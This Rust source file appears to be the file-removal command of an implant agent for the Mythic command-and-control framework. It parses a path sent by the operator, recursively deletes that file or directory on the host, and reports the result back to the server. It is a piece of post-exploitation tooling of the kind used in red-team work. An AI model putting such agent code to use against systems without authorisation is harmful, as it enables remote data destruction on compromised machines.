use crate::agent::AgentTask;
use serde::Deserialize;
use serde_json::json;
use std::error::Error;
use std::fs;

/// Struct containing the `rm` task parameters
#[derive(Deserialize)]
struct MythicFileRm {
    /// Host to remove the file from
    host: String,

    /// Path to remove
    path: String,
}

/// Removes a file or directory from the host system
/// * `task` - Task information
pub fn remove(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    // Parse the task parameters
    let params: MythicFileRm = serde_json::from_str(&task.parameters)?;

    // Create a path from the parameters
    let path = std::path::Path::new(&params.path);

    // Get the absolute path
    let full_path = if path.is_absolute() {
        path.canonicalize()?
    } else {
        let path = std::env::current_dir()?.join(path);
        path.canonicalize()?
    };

    // Check if the file is a file or directory and remove it
    if full_path.is_dir() {
        fs::remove_dir_all(&full_path)?;
    } else {
        fs::remove_file(&full_path)?;
    }

    let full_path = String::from(full_path.to_string_lossy());

    // Send the output up to Mythic
    Ok(json!({
        "task_id": task.id,
        "status": "success",
        "completed": true,
        "user_output": format!("Removed '{}'", &full_path),
        "removed_files": [{
            "host": params.host,
            "path": full_path,
        }]
    }))
}
